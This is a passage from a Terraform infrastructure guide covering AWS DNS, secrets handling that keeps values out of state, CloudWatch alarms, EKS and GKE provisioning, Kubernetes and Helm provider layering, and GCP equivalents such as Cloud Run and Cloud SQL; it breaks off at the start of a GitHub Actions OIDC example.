💰 **`deregistration_delay`** defaults to 300 seconds. During a deploy, old tasks sit draining for five minutes, costing money and slowing the rollout. 30 seconds is right for most HTTP services; raise it if you have long-lived requests.

### 34.4 DNS

```hcl
resource "aws_route53_record" "api" {
  zone_id = var.route53_zone_id
  name    = var.hostname
  type    = "A"

  alias {
    name                   = aws_lb.main.dns_name
    zone_id                = aws_lb.main.zone_id
    evaluate_target_health = true
  }
}
```

Use **alias records** rather than CNAMEs for AWS resources: they work at the zone apex, they are free (no query charges), and they update automatically if the ALB's IPs change.

---

## Chapter 35 — Secrets and Configuration

### 35.1 The decision table

| Kind of value | Where it belongs | How the app gets it |
|---|---|---|
| Non-secret config (log level, feature flags, region) | Terraform variable → task definition `environment` | Env var |
| Non-secret shared config (VPC ID, cluster ARN) | SSM Parameter Store, `String` | Env var or SDK call |
| Secret, AWS-generated (DB password) | `manage_master_user_password` → Secrets Manager | ECS `secrets` block |
| Secret, external (third-party API key) | Created **outside Terraform**, referenced by ARN | ECS `secrets` block |
| Secret, must be generated by Terraform | `random_password` + write-only attributes | ECS `secrets` block |
| Certificate private key | ACM (never leaves AWS) | ALB references the ARN |

### 35.2 The pattern: Terraform creates the container, a human or a rotation Lambda fills it

```hcl
resource "aws_secretsmanager_secret" "third_party_api_key" {
  name                    = "${var.environment}/${var.name}/third-party-api-key"
  description             = "API key for the payment provider. Set manually; rotated quarterly."
  kms_key_id              = var.kms_key_arn
  recovery_window_in_days = 30

  tags = local.common_tags
}

# ⚠️ NOTE: no aws_secretsmanager_secret_version resource here.
# Terraform creates the empty container. The VALUE is set by:
#   aws secretsmanager put-secret-value --secret-id ... --secret-string ...
# run by a human or a rotation Lambda. Terraform never sees it.
```

Then reference it:

```hcl
module "api" {
  source = "../../modules/ecs-service"
  secrets = {
    THIRD_PARTY_API_KEY = aws_secretsmanager_secret.third_party_api_key.arn
    DB_PASSWORD         = module.database.master_user_secret_arn
  }
}
```

🧠 **This is the whole trick: Terraform manages the *reference*, never the *value*.** The ARN is not sensitive. The value never enters state, never appears in a plan, never reaches a CI log.

⚠️ If you must include a specific version or key from a JSON secret, the ECS `valueFrom` syntax supports `arn:...:secret:name-AbCdEf:json-key:version-stage:version-id`.

### 35.3 When Terraform must generate the secret

```hcl
resource "random_password" "app" {
  length           = 32
  special          = true
  override_special = "!#$%&*()-_=+[]{}<>:?"

  # Changing keepers forces regeneration
  keepers = {
    version = var.secret_version
  }
}

resource "aws_secretsmanager_secret" "app" {
  name       = "${var.environment}/${var.name}/app-secret"
  kms_key_id = var.kms_key_arn
}

# 🔬 Terraform 1.11+ — write-only argument keeps the value out of state
resource "aws_secretsmanager_secret_version" "app" {
  secret_id         = aws_secretsmanager_secret.app.id
  secret_string_wo  = random_password.app.result
  secret_string_wo_version = var.secret_version
}
```

⚠️ **Even with `secret_string_wo`, the `random_password.app.result` is itself stored in state** — `random_password` is a managed resource and its result is an attribute. Write-only arguments stop the value reaching the *consuming* resource's state entry, but the generator still records it.

**Recommendation:** for anything genuinely sensitive, generate outside Terraform. Use `manage_master_user_password` for RDS, a rotation Lambda for API keys, and `random_password` only for values whose exposure in state is acceptable.

### 35.4 Ephemeral resources

🔬 Terraform 1.10+ / OpenTofu 1.11+.

```hcl
ephemeral "aws_secretsmanager_secret_version" "db" {
  secret_id = aws_secretsmanager_secret.db.id
}

resource "aws_db_instance" "main" {
  password_wo         = jsondecode(ephemeral.aws_secretsmanager_secret_version.db.secret_string)["password"]
  password_wo_version = 1
}
```

An ephemeral resource is read during plan and apply, held in memory, and **never written to state or to the plan file**. It is the correct tool for "I need this secret's value to configure something, but I must not persist it."

Limitations: ephemeral values can only be consumed by write-only arguments, other ephemeral resources, ephemeral variables/outputs, and provider configuration. You cannot use one in an ordinary resource argument.

### 35.5 Comparison

| Mechanism | Value in state? | Version | Use for |
|---|---|---|---|
| Plain argument | ✅ Yes, plaintext | any | Never, for secrets |
| `sensitive = true` | ✅ **Yes, plaintext** — only CLI output is redacted | any | Reducing shoulder-surfing only |
| `ephemeral` resource | ❌ No | 1.10+ | Reading a secret to configure something |
| Write-only argument (`*_wo`) | ❌ No | 1.11+ | Passing a secret into a resource |
| `manage_master_user_password` | ❌ No | any | RDS/Aurora master passwords. **Best option** |
| ECS `secrets` block (ARN only) | ARN only | any | Injecting into containers. **Best option** |

---

## Chapter 36 — Observability Infrastructure

```hcl
resource "aws_sns_topic" "alarms" {
  name              = "${local.name_prefix}-alarms"
  kms_master_key_id = var.kms_key_arn
  tags              = local.common_tags
}

resource "aws_sns_topic_subscription" "slack" {
  topic_arn = aws_sns_topic.alarms.arn
  protocol  = "https"
  endpoint  = var.slack_webhook_url    # via a Lambda or AWS Chatbot in practice
}

locals {
  alarm_defaults = {
    alarm_actions             = [aws_sns_topic.alarms.arn]
    ok_actions                = [aws_sns_topic.alarms.arn]
    treat_missing_data        = "notBreaching"
    insufficient_data_actions = []
  }
}

resource "aws_cloudwatch_metric_alarm" "service_cpu" {
  alarm_name          = "${local.name_prefix}-${var.name}-cpu-high"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 3
  datapoints_to_alarm = 2
  metric_name         = "CPUUtilization"
  namespace           = "AWS/ECS"
  period              = 60
  statistic           = "Average"
  threshold           = 85
  alarm_description   = "ECS service ${var.name} CPU above 85% for 2 of 3 minutes"

  dimensions = {
    ClusterName = var.cluster_name
    ServiceName = aws_ecs_service.this.name
  }

  alarm_actions      = local.alarm_defaults.alarm_actions
  ok_actions         = local.alarm_defaults.ok_actions
  treat_missing_data = local.alarm_defaults.treat_missing_data
  tags               = local.common_tags
}

resource "aws_cloudwatch_metric_alarm" "alb_5xx" {
  alarm_name          = "${local.name_prefix}-${var.name}-5xx"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 2
  metric_name         = "HTTPCode_Target_5XX_Count"
  namespace           = "AWS/ApplicationELB"
  period              = 60
  statistic           = "Sum"
  threshold           = 10
  alarm_description   = "More than 10 5xx responses per minute from ${var.name}"

  dimensions = {
    LoadBalancer = var.alb_arn_suffix
    TargetGroup  = aws_lb_target_group.this.arn_suffix
  }

  alarm_actions      = local.alarm_defaults.alarm_actions
  treat_missing_data = "notBreaching"
  tags               = local.common_tags
}

resource "aws_cloudwatch_metric_alarm" "unhealthy_hosts" {
  alarm_name          = "${local.name_prefix}-${var.name}-unhealthy-targets"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 2
  metric_name         = "UnHealthyHostCount"
  namespace           = "AWS/ApplicationELB"
  period              = 60
  statistic           = "Maximum"
  threshold           = 0
  alarm_description   = "One or more ${var.name} targets are failing health checks"

  dimensions = {
    LoadBalancer = var.alb_arn_suffix
    TargetGroup  = aws_lb_target_group.this.arn_suffix
  }

  alarm_actions      = local.alarm_defaults.alarm_actions
  treat_missing_data = "breaching"      # ⚠️ no data here means something is very wrong
  tags               = local.common_tags
}

resource "aws_cloudwatch_log_metric_filter" "errors" {
  name           = "${local.name_prefix}-${var.name}-errors"
  log_group_name = aws_cloudwatch_log_group.service.name
  pattern        = "{ $.level = \"ERROR\" }"

  metric_transformation {
    name          = "${var.name}ErrorCount"
    namespace     = "Acme/${var.environment}"
    value         = "1"
    default_value = "0"
    unit          = "Count"
  }
}
```

⚠️ **`treat_missing_data` deserves thought per alarm.** `notBreaching` is right for a metric that legitimately has gaps (5xx count at low traffic). `breaching` is right for a metric whose absence indicates failure (healthy host count). The default (`missing`) leaves the alarm in its previous state, which is rarely what you want.

**Recommendation:** alarms belong with the service that owns them, in the application stack. That way deleting a service deletes its alarms, and there is no orphan alarm paging someone about a service that no longer exists.

---
## Chapter 37 — Kubernetes: Provisioning EKS and GKE

### 37.1 The layering that matters

```mermaid
flowchart TD
    subgraph S1["Stack 1 — Cluster · Terraform · changes: quarterly"]
        C1["EKS/GKE control plane"]
        C2["Node groups / node pools"]
        C3["Cluster IAM roles, OIDC provider"]
        C4["VPC CNI, kube-proxy, CoreDNS addons"]
    end
    subgraph S2["Stack 2 — Platform add-ons · Terraform + Helm provider · weekly"]
        P1["ingress-nginx or AWS Load Balancer Controller"]
        P2["cert-manager, external-dns"]
        P3["Karpenter / cluster-autoscaler"]
        P4["Prometheus, Loki, Grafana"]
        P5["ArgoCD itself"]
    end
    subgraph S3["Stack 3 — Application workloads · NOT Terraform · daily"]
        A1["Deployments, Services, Ingresses"]
        A2["ConfigMaps, HPAs"]
        A3["Managed by ArgoCD / Flux from a Git repo"]
    end
    S1 --> S2
    S2 --> S3
```

🧠 **Three stacks, three tools, three cadences.** The single biggest Kubernetes-plus-Terraform mistake is collapsing these. Chapter 38 explains exactly why.

### 37.2 EKS

**Recommendation:** use `terraform-aws-modules/eks/aws` (21.26.0). Writing an EKS cluster by hand is roughly 600 lines of IAM, security groups, addon configuration and OIDC plumbing, all of which the module has already got right.

```hcl
# stacks/platform/production/eks.tf
module "eks" {
  source  = "terraform-aws-modules/eks/aws"
  version = "~> 21.26"

  name               = local.name_prefix
  kubernetes_version = "1.31"

  vpc_id     = data.aws_ssm_parameter.vpc_id.value
  subnet_ids = split(",", data.aws_ssm_parameter.private_subnet_ids.value)

  # Control plane endpoint access
  endpoint_public_access       = true
  endpoint_public_access_cidrs = var.admin_cidrs     # ⚠️ never 0.0.0.0/0 in production
  endpoint_private_access      = true

  # Secrets encryption with your own KMS key
  encryption_config = {
    resources = ["secrets"]
  }
  create_kms_key            = true
  kms_key_enable_default_policy = true
  kms_key_deletion_window_in_days = 30

  enabled_log_types = ["api", "audit", "authenticator", "controllerManager", "scheduler"]

  # Modern access management — replaces the old aws-auth ConfigMap
  authentication_mode                      = "API"
  enable_cluster_creator_admin_permissions = false

  access_entries = {
    platform_team = {
      principal_arn = aws_iam_role.platform_admin.arn
      policy_associations = {
        admin = {
          policy_arn = "arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy"
          access_scope = { type = "cluster" }
        }
      }
    }
    api_team = {
      principal_arn = aws_iam_role.api_team.arn
      policy_associations = {
        edit = {
          policy_arn = "arn:aws:eks::aws:cluster-access-policy/AmazonEKSEditPolicy"
          access_scope = {
            type       = "namespace"
            namespaces = ["api", "api-staging"]
          }
        }
      }
    }
  }

  addons = {
    coredns                = { most_recent = true }
    kube-proxy             = { most_recent = true }
    eks-pod-identity-agent = { most_recent = true }
    vpc-cni = {
      most_recent = true
      before_compute = true          # must exist before nodes join
      configuration_values = jsonencode({
        env = {
          ENABLE_PREFIX_DELEGATION = "true"    # 💰 far more pods per node
          WARM_PREFIX_TARGET       = "1"
        }
      })
    }
    aws-ebs-csi-driver = {
      most_recent              = true
      service_account_role_arn = module.ebs_csi_irsa.arn
    }
  }

  eks_managed_node_groups = {
    system = {
      instance_types = ["m7g.large"]     # Graviton — 💰 cheaper
      ami_type       = "AL2023_ARM_64_STANDARD"
      capacity_type  = "ON_DEMAND"
      min_size       = 2
      max_size       = 4
      desired_size   = 2

      labels = { role = "system" }
      taints = {
        system = {
          key    = "dedicated"
          value  = "system"
          effect = "NO_SCHEDULE"
        }
      }
    }

    apps = {
      instance_types = ["m7g.xlarge", "m7g.2xlarge"]
      ami_type       = "AL2023_ARM_64_STANDARD"
      capacity_type  = var.environment == "production" ? "ON_DEMAND" : "SPOT"
      min_size       = 3
      max_size       = 20
      desired_size   = 3

      labels = { role = "apps" }

      # Do not fight the autoscaler over desired_size
      update_config = { max_unavailable_percentage = 33 }
    }
  }

  tags = local.common_tags
}
```

⚠️ **`desired_size` and autoscalers conflict.** Once Karpenter or the cluster-autoscaler is managing capacity, Terraform will keep trying to reset `desired_size` to the configured value. The module handles this for managed node groups, but verify with a plan after your autoscaler has scaled — if you see a diff, add `ignore_changes`.

**IRSA / Pod Identity** — how pods get AWS permissions:

```hcl
module "api_irsa" {
  source  = "terraform-aws-modules/iam/aws//modules/iam-role-for-service-accounts-eks"
  version = "~> 5.0"

  name = "${local.name_prefix}-api"

  oidc_providers = {
    main = {
      provider_arn               = module.eks.oidc_provider_arn
      namespace_service_accounts = ["api:api-sa"]
    }
  }

  role_policy_arns = {
    app = aws_iam_policy.api_app.arn
  }
}
```

🧠 The newer **EKS Pod Identity** (the `eks-pod-identity-agent` addon) is simpler than IRSA — no OIDC trust policy per role, just an association. Prefer it for new clusters.

### 37.3 GKE

```hcl
# stacks/platform/production/gke.tf
resource "google_container_cluster" "main" {
  name     = local.name_prefix
  location = var.region                     # regional cluster — control plane in 3 zones

  # Create the cluster without the default pool, then manage pools separately.
  remove_default_node_pool = true
  initial_node_count       = 1

  network    = google_compute_network.main.id
  subnetwork = google_compute_subnetwork.main.id

  # VPC-native (alias IP) — required for most modern features
  ip_allocation_policy {
    cluster_secondary_range_name  = "pods"
    services_secondary_range_name = "services"
  }

  private_cluster_config {
    enable_private_nodes    = true
    enable_private_endpoint = false          # true means no public control plane access
    master_ipv4_cidr_block  = "172.16.0.0/28"

    master_global_access_config { enabled = false }
  }

  master_authorized_networks_config {
    dynamic "cidr_blocks" {
      for_each = var.admin_cidrs
      content {
        cidr_block   = cidr_blocks.value
        display_name = "admin"
      }
    }
  }

  # Workload Identity — the GKE equivalent of IRSA
  workload_identity_config {
    workload_pool = "${var.project_id}.svc.id.goog"
  }

  release_channel { channel = "REGULAR" }

  addons_config {
    horizontal_pod_autoscaling { disabled = false }
    http_load_balancing        { disabled = false }
    gcp_filestore_csi_driver_config { enabled = false }
    gce_persistent_disk_csi_driver_config { enabled = true }
  }

  # Encrypt etcd secrets with your own key
  database_encryption {
    state    = "ENCRYPTED"
    key_name = google_kms_crypto_key.gke.id
  }

  binary_authorization {
    evaluation_mode = "PROJECT_SINGLETON_POLICY_ENFORCE"
  }

  logging_config {
    enable_components = ["SYSTEM_COMPONENTS", "WORKLOADS"]
  }
  monitoring_config {
    enable_components = ["SYSTEM_COMPONENTS"]
    managed_prometheus { enabled = true }
  }

  maintenance_policy {
    recurring_window {
      start_time = "2026-01-01T19:00:00Z"
      end_time   = "2026-01-01T23:00:00Z"
      recurrence = "FREQ=WEEKLY;BYDAY=SA,SU"
    }
  }

  deletion_protection = var.environment == "production"

  lifecycle {
    prevent_destroy = true
    ignore_changes  = [
      # GKE upgrades the control plane within the release channel
      min_master_version,
    ]
  }
}

resource "google_container_node_pool" "apps" {
  name     = "apps"
  cluster  = google_container_cluster.main.id
  location = var.region

  # per-zone count; a regional cluster multiplies this by the zone count
  initial_node_count = 1

  autoscaling {
    min_node_count = 1
    max_node_count = 10
    location_policy = "BALANCED"
  }

  management {
    auto_repair  = true
    auto_upgrade = true
  }

  upgrade_settings {
    strategy        = "SURGE"
    max_surge       = 1
    max_unavailable = 0
  }

  node_config {
    machine_type = "t2a-standard-4"          # Arm (Tau T2A) — 💰 cheaper
    disk_size_gb = 100
    disk_type    = "pd-balanced"
    spot         = var.environment != "production"

    service_account = google_service_account.gke_nodes.email
    oauth_scopes    = ["https://www.googleapis.com/auth/cloud-platform"]

    workload_metadata_config {
      mode = "GKE_METADATA"                   # required for Workload Identity
    }

    shielded_instance_config {
      enable_secure_boot          = true
      enable_integrity_monitoring = true
    }

    labels = local.labels
    tags   = ["gke-node", local.name_prefix]
  }

  lifecycle {
    ignore_changes = [initial_node_count]
  }
}
```

**Recommendation:** `terraform-google-modules/kubernetes-engine/google` (45.0.0) covers this well and handles the many GKE-specific defaults. Use the `beta-private-cluster` submodule for private clusters.

**Workload Identity binding** — the GKE equivalent of IRSA:

```hcl
resource "google_service_account" "api" {
  account_id   = "api-workload"
  display_name = "API service workload identity"
}

resource "google_service_account_iam_member" "api_workload_identity" {
  service_account_id = google_service_account.api.name
  role               = "roles/iam.workloadIdentityUser"
  member             = "serviceAccount:${var.project_id}.svc.id.goog[api/api-sa]"
}

resource "google_project_iam_member" "api_storage" {
  project = var.project_id
  role    = "roles/storage.objectAdmin"
  member  = "serviceAccount:${google_service_account.api.email}"
}
```

The Kubernetes ServiceAccount then carries an annotation:

```yaml
metadata:
  annotations:
    iam.gke.io/gcp-service-account: api-workload@my-project.iam.gserviceaccount.com
```

### 37.4 EKS vs GKE from a Terraform perspective

| | EKS | GKE |
|---|---|---|
| Lines of Terraform for a working cluster | More — IAM, OIDC, addons are explicit | Fewer — more is managed |
| Community module quality | `terraform-aws-modules/eks` is excellent | `terraform-google-modules/kubernetes-engine` is good |
| Pod identity | IRSA (OIDC) or EKS Pod Identity | Workload Identity |
| Node management | Managed node groups or Karpenter | Node pools with autoscaling, or Autopilot |
| Networking | VPC CNI — ⚠️ **pods consume VPC IPs**; plan CIDRs generously | Alias IPs from a secondary range |
| Control plane cost | 💰 ~$73/month per cluster | 💰 ~$73/month per cluster (free for one zonal cluster per billing account) |
| Upgrade experience | You drive it | Release channels auto-upgrade |
| "Just give me pods" | Fargate profiles (limited) | **Autopilot** — genuinely good |

⚠️ **The EKS VPC CNI IP consumption problem is the most common EKS capacity surprise.** Each pod gets a real VPC IP. A `/24` private subnet gives you ~251 pods *per subnet*, not per node. `ENABLE_PREFIX_DELEGATION = "true"` helps enormously by allocating /28 prefixes instead of individual IPs.

---

## Chapter 38 — The Kubernetes and Helm Providers, and When Not to Use Them

### 38.1 The core problem

```mermaid
flowchart TD
    A["Terraform plan starts"] --> B["Provider configuration is evaluated"]
    B --> C{"Does the kubernetes provider's<br/>host/token come from a resource<br/>in THIS SAME configuration?"}
    C -->|"Yes — cluster and workloads<br/>in one stack"| D["⚠️ On the FIRST apply the cluster<br/>does not exist yet, so the provider<br/>cannot be configured.<br/><br/>On DESTROY the cluster goes first,<br/>then Terraform cannot reach the API<br/>to clean up → state is stuck."]
    C -->|"No — separate stacks,<br/>credentials read via data source"| E["✅ Provider configures cleanly.<br/>Apply and destroy both work."]
```

This is not a bug you can work around cleverly. It is a structural consequence of provider configuration being evaluated before the graph is walked.

⚠️ **The symptoms**, which are notoriously confusing:
- `Error: Get "http://localhost/api/v1/namespaces": dial tcp 127.0.0.1:80: connect: connection refused` — the provider fell back to a default because its configuration was unknown.
- `Provider configuration not present` on destroy.
- Plans that work on a second run but not a first.

### 38.2 The correct structure

**Stack 1 — the cluster. No Kubernetes or Helm provider at all.**

```hcl
# stacks/platform/production/main.tf
module "eks" {
  source  = "terraform-aws-modules/eks/aws"
  version = "~> 21.26"
  # ...
}

resource "aws_ssm_parameter" "cluster_name" {
  name  = "/acme/production/eks/cluster_name"
  type  = "String"
  value = module.eks.cluster_name
}
```

**Stack 2 — the add-ons. Providers configured from a data source, not from a resource.**

```hcl
# stacks/platform-addons/production/providers.tf
data "aws_ssm_parameter" "cluster_name" {
  name = "/acme/production/eks/cluster_name"
}

data "aws_eks_cluster" "main" {
  name = data.aws_ssm_parameter.cluster_name.value
}

provider "kubernetes" {
  host                   = data.aws_eks_cluster.main.endpoint
  cluster_ca_certificate = base64decode(data.aws_eks_cluster.main.certificate_authority[0].data)

  # ✅ exec auth — a fresh token every call.
  # ⚠️ Do NOT use data.aws_eks_cluster_auth: its token expires after 15 minutes
  # and long applies fail halfway through with 401s.
  exec {
    api_version = "client.authentication.k8s.io/v1beta1"
    command     = "aws"
    args = [
      "eks", "get-token",
      "--cluster-name", data.aws_eks_cluster.main.name,
      "--region", var.aws_region,
    ]
  }
}

provider "helm" {
  kubernetes = {
    host                   = data.aws_eks_cluster.main.endpoint
    cluster_ca_certificate = base64decode(data.aws_eks_cluster.main.certificate_authority[0].data)
    exec = {
      api_version = "client.authentication.k8s.io/v1beta1"
      command     = "aws"
      args        = ["eks", "get-token", "--cluster-name", data.aws_eks_cluster.main.name, "--region", var.aws_region]
    }
  }
}
```

🔬 **Helm provider v3 changed the configuration syntax.** In v2 it was a nested `kubernetes { }` block; in v3 (built on the Plugin Framework) it is an attribute `kubernetes = { }`. Copying a v2 example into a v3 configuration produces a confusing schema error. Same for the exec block.

For GKE:

```hcl
data "google_container_cluster" "main" {
  name     = var.cluster_name
  location = var.region
}

data "google_client_config" "default" {}

provider "kubernetes" {
  host                   = "https://${data.google_container_cluster.main.endpoint}"
  cluster_ca_certificate = base64decode(data.google_container_cluster.main.master_auth[0].cluster_ca_certificate)
  token                  = data.google_client_config.default.access_token
}
```

### 38.3 Helm releases

```hcl
resource "helm_release" "aws_lb_controller" {
  name       = "aws-load-balancer-controller"
  repository = "https://aws.github.io/eks-charts"
  chart      = "aws-load-balancer-controller"
  version    = "1.9.2"                         # ⚠️ ALWAYS pin
  namespace  = "kube-system"

  set = [
    { name = "clusterName", value = data.aws_eks_cluster.main.name },
    { name = "serviceAccount.create", value = "true" },
    { name = "serviceAccount.name", value = "aws-load-balancer-controller" },
    { name = "serviceAccount.annotations.eks\\.amazonaws\\.com/role-arn", value = module.lb_controller_irsa.arn },
    { name = "region", value = var.aws_region },
    { name = "vpcId", value = data.aws_ssm_parameter.vpc_id.value },
  ]

  atomic          = true        # roll back automatically if the release fails
  cleanup_on_fail = true
  wait            = true
  timeout         = 600
}

resource "helm_release" "cert_manager" {
  name             = "cert-manager"
  repository       = "https://charts.jetstack.io"
  chart            = "cert-manager"
  version          = "v1.16.1"
  namespace        = "cert-manager"
  create_namespace = true

  values = [
    yamlencode({
      crds = { enabled = true }
      serviceAccount = {
        annotations = {
          "eks.amazonaws.com/role-arn" = module.cert_manager_irsa.arn
        }
      }
      prometheus = { enabled = true }
    })
  ]

  atomic  = true
  wait    = true
  timeout = 600
}
```

🧠 **`atomic = true` is the Helm equivalent of ECS's deployment circuit breaker.** A failed release rolls back automatically instead of leaving the cluster in a half-upgraded state.

⚠️ **Helm CRD handling is a real problem.** Helm does not upgrade CRDs on `helm upgrade` — only on first install. Terraform will report success while the CRDs remain on the old version. For charts with CRDs (cert-manager, Prometheus Operator, ArgoCD), either apply CRDs separately or use the chart's documented CRD upgrade procedure.

### 38.4 What NOT to manage with Terraform

🧠 **The rule: Terraform for things that exist once and change rarely. GitOps for things that change with every deploy.**

| Object | Terraform? | Why |
|---|---|---|
| The cluster itself | ✅ Yes | Cloud resource, changes quarterly |
| Node groups / pools | ✅ Yes | Cloud resource |
| IRSA / Workload Identity roles | ✅ Yes | Cloud IAM |
| Namespaces | ✅ Yes | Rarely change, need RBAC alongside |
| ResourceQuotas, LimitRanges | ✅ Yes | Platform policy |
| Cluster add-ons via Helm | ⚠️ Acceptable | Or use ArgoCD — see below |
| ArgoCD itself | ✅ Yes | The bootstrap for everything else |
| **Application Deployments** | ❌ **No** | Changes on every release |
| **Services, Ingresses** | ❌ No | Belongs with the app |
| **ConfigMaps for apps** | ❌ No | Changes with the app |
| **HPAs** | ❌ No | Belongs with the app |
| **Secrets** | ❌ No | Use External Secrets Operator |

**Why not Deployments?**

1. Every release becomes a Terraform apply — slow, and it needs cloud credentials.
2. Terraform's Kubernetes provider does not understand rollout status well. `wait_for_rollout` helps but is not as good as `kubectl rollout status`.
3. It fights controllers. An HPA changes `replicas`; Terraform plans to change it back. Forever.
4. You lose everything Kubernetes-native — `kubectl rollout undo`, Argo Rollouts, progressive delivery.

```mermaid
flowchart LR
    subgraph TF["Terraform · quarterly"]
        T1["EKS/GKE cluster"] --> T2["Node pools"]
        T2 --> T3["IRSA roles"]
        T3 --> T4["Namespaces + RBAC"]
        T4 --> T5["ArgoCD (bootstrap only)"]
    end
    subgraph GIT["Git repository · daily"]
        G1["apps/api/deployment.yaml"]
        G2["apps/api/service.yaml"]
        G3["apps/worker/..."]
    end
    subgraph ARGO["ArgoCD · continuous"]
        A1["Watches the Git repo"]
        A2["Reconciles the cluster<br/>to match Git"]
        A3["Self-heals drift automatically"]
    end
    T5 --> A1
    G1 --> A1
    A1 --> A2 --> A3
```

**Recommendation:** Terraform creates the cluster and bootstraps ArgoCD. ArgoCD manages everything else, including — via the app-of-apps pattern — the platform add-ons. This gets Terraform out of the Kubernetes API entirely after bootstrap, which removes the provider-configuration problem and the destroy-ordering problem at the same time.

### 38.5 If you do use the Kubernetes provider

```hcl
resource "kubernetes_namespace" "api" {
  metadata {
    name = "api"
    labels = {
      "app.kubernetes.io/managed-by" = "terraform"
      "pod-security.kubernetes.io/enforce" = "restricted"
    }
  }
}

resource "kubernetes_resource_quota" "api" {
  metadata {
    name      = "quota"
    namespace = kubernetes_namespace.api.metadata[0].name
  }
  spec {
    hard = {
      "requests.cpu"    = "10"
      "requests.memory" = "20Gi"
      "limits.cpu"      = "20"
      "limits.memory"   = "40Gi"
      "pods"            = "50"
    }
  }
}
```

🔬 **`kubernetes_manifest`** lets you apply arbitrary YAML, but ⚠️ it requires the CRD to exist **at plan time**, which breaks the common "install the operator and its custom resources in one apply" pattern. Split into two applies, or use the `kubectl` provider (community) which is more forgiving.

---

## Chapter 39 — GCP Equivalents

A concordance for everything covered so far.

### 39.1 The service mapping

| Concept | AWS | GCP |
|---|---|---|
| Virtual network | VPC | VPC network (global) + regional subnetworks |
| Subnet | Subnet (per AZ) | Subnetwork (per region) |
| Outbound internet from private | NAT Gateway | Cloud NAT |
| Private service access | VPC Endpoint | Private Service Connect / Private Google Access |
| Managed containers | ECS Fargate | **Cloud Run** |
| Kubernetes | EKS | GKE |
| Container registry | ECR | Artifact Registry |
| Load balancer | ALB | Global External Application Load Balancer |
| Certificates | ACM | Certificate Manager / google_compute_managed_ssl_certificate |
| DNS | Route53 | Cloud DNS |
| Relational DB | RDS / Aurora | Cloud SQL / AlloyDB |
| Redis | ElastiCache | Memorystore |
| Queue | SQS | Pub/Sub |
| Object storage | S3 | Cloud Storage |
| Secrets | Secrets Manager | Secret Manager |
| Config | SSM Parameter Store | Secret Manager / Runtime Config |
| Identity for workloads | IAM role + IRSA/Pod Identity | Service account + Workload Identity |
| Logs and metrics | CloudWatch | Cloud Logging / Cloud Monitoring |
| Encryption keys | KMS | Cloud KMS |
| Account boundary | AWS account | GCP **project** |
| Org policy | SCP | Organization Policy Constraints |

🧠 **The most important structural difference: GCP's project is a much lighter boundary than an AWS account.** Creating a project is an API call; creating an AWS account is a slow, semi-manual process. This means GCP architectures naturally use far more projects — often one per environment per service — where AWS uses one account per environment.

### 39.2 A Cloud Run service — the ECS Fargate equivalent

```hcl
resource "google_cloud_run_v2_service" "api" {
  name     = "${local.name_prefix}-api"
  location = var.region
  project  = var.project_id

  ingress = "INGRESS_TRAFFIC_INTERNAL_LOAD_BALANCER"

  deletion_protection = var.environment == "production"

  template {
    service_account = google_service_account.api.email

    scaling {
      min_instance_count = var.environment == "production" ? 2 : 0
      max_instance_count = 100
    }

    vpc_access {
      network_interfaces {
        network    = google_compute_network.main.id
        subnetwork = google_compute_subnetwork.main.id
      }
      egress = "PRIVATE_RANGES_ONLY"
    }

    containers {
      image = var.image

      ports { container_port = 8080 }

      resources {
        limits = {
          cpu    = "2"
          memory = "2Gi"
        }
        cpu_idle          = true      # 💰 only bill CPU during requests
        startup_cpu_boost = true
      }

      env {
        name  = "ENVIRONMENT"
        value = var.environment
      }

      # ✅ Secret injected by Cloud Run, not by Terraform.
      # The value never enters Terraform state.
      env {
        name = "DB_PASSWORD"
        value_source {
          secret_key_ref {
            secret  = google_secret_manager_secret.db_password.secret_id
            version = "latest"
          }
        }
      }

      startup_probe {
        http_get { path = "/actuator/health/readiness" }
        initial_delay_seconds = 10
        period_seconds        = 5
        failure_threshold     = 20
      }

      liveness_probe {
        http_get { path = "/actuator/health/liveness" }
        period_seconds = 30
      }
    }

    max_instance_request_concurrency = 80
    timeout                          = "60s"
  }

  traffic {
    type    = "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST"
    percent = 100
  }

  labels = local.labels

  lifecycle {
    ignore_changes = [
      # The CD pipeline deploys new images — same boundary as ECS
      template[0].containers[0].image,
      client,
      client_version,
    ]
  }
}
```

💰 **`cpu_idle = true` is the big Cloud Run cost lever** — you are billed for CPU only while handling a request. With `min_instance_count = 0`, an idle service costs essentially nothing, which makes Cloud Run dramatically cheaper than Fargate for spiky or low-traffic workloads.

### 39.3 Cloud SQL

```hcl
resource "google_sql_database_instance" "main" {
  name             = "${local.name_prefix}-postgres"
  database_version = "POSTGRES_17"
  region           = var.region
  project          = var.project_id

  deletion_protection = var.environment == "production"

  settings {
    tier              = var.tier                          # e.g. db-custom-4-16384
    availability_type = var.environment == "production" ? "REGIONAL" : "ZONAL"
    disk_type         = "PD_SSD"
    disk_size         = 100
    disk_autoresize   = true
    disk_autoresize_limit = 500

    backup_configuration {
      enabled                        = true
      start_time                     = "18:00"
      point_in_time_recovery_enabled = true
      transaction_log_retention_days = 7
      backup_retention_settings {
        retained_backups = var.environment == "production" ? 30 : 7
        retention_unit   = "COUNT"
      }
    }

    ip_configuration {
      ipv4_enabled                                  = false     # no public IP
      private_network                               = google_compute_network.main.id
      enable_private_path_for_google_cloud_services = true
      ssl_mode                                      = "ENCRYPTED_ONLY"
    }

    database_flags {
      name  = "log_min_duration_statement"
      value = "1000"
    }

    insights_config {
      query_insights_enabled  = true
      query_string_length     = 1024
      record_application_tags = true
    }

    maintenance_window {
      day          = 7        # Sunday
      hour         = 20
      update_track = "stable"
    }

    user_labels = local.labels
  }

  lifecycle {
    prevent_destroy = true
    ignore_changes  = [settings[0].disk_size]   # autoresize changes this
  }

  depends_on = [google_service_networking_connection.main]
}

# Password generated and stored WITHOUT Terraform seeing it is harder on GCP.
# Best available: generate, store in Secret Manager, and accept it is in state,
# OR set the password out-of-band and use ignore_changes.
resource "google_sql_user" "app" {
  name     = "appuser"
  instance = google_sql_database_instance.main.name
  project  = var.project_id
  password_wo         = ephemeral.google_secret_manager_secret_version.db.secret_data
  password_wo_version = var.password_version

  lifecycle { ignore_changes = [password] }
}
```

⚠️ GCP has no exact `manage_master_user_password` equivalent. Use write-only arguments with an ephemeral Secret Manager read, as shown.

### 39.4 GCP OIDC from GitHub Actions

Two approaches, and the newer one is simpler.

**Direct Workload Identity Federation** (no service account impersonation):

```hcl
